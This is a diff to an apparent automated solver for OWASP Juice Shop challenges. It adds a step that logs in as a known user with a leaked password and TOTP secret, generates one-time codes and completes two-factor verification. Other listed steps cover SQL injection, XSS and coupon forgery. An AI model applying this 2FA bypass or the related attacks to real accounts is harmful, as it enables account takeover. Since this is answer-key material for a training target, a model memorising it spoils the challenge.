@@ -279,6 +279,35 @@ def _forged_coupon(c):
         pass
 
 
+def _two_factor(c):
+    """Two Factor Authentication — the TOTP secret + password are stored/leaked, so log in as
+    wurstbrot, compute the TOTP natively and complete 2FA verification."""
+    import base64
+    import hashlib
+    import hmac
+    import struct
+    import time
+    secret = "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"
+
+    def _totp(t):
+        key = base64.b32decode(secret + "=" * ((8 - len(secret) % 8) % 8))
+        h = hmac.new(key, struct.pack(">Q", int(t // 30)), hashlib.sha1).digest()
+        o = h[-1] & 0x0F
+        return "%06d" % ((struct.unpack(">I", h[o:o + 4])[0] & 0x7FFFFFFF) % 1000000)
+
+    try:
+        j = c.post("/rest/user/login", json={"email": "wurstbrot@juice-sh.op",
+                   "password": "EinBelegtesBrotMitSchinkenSCHINKEN!"}).json()
+        tmp = (j.get("data") or {}).get("tmpToken") or j.get("tmpToken")
+        if tmp:
+            for dt in (0, -30, 30):
+                r = c.post("/rest/2fa/verify", json={"tmpToken": tmp, "totpToken": _totp(time.time() + dt)})
+                if r.status_code in (200, 201):
+                    break
+    except Exception:
+        pass
+
+
 def _socket_xss(c):
     """DOM XSS + Bonus Payload + Cross-Site Imaging via the frontend's Socket.IO verify events
     (engine.io v4 polling handshake -> emit). Server solves on contains/regex — no browser."""
@@ -324,7 +353,7 @@ def solve(base_url: str) -> dict:
         for step in (_sqli_logins, _known_cred_logins, _known_login_challenges, _registrations,
                      _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud,
                      _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders,
-                     _forged_coupon):
+                     _forged_coupon, _two_factor):
             try:
                 step(c)
             except Exception:
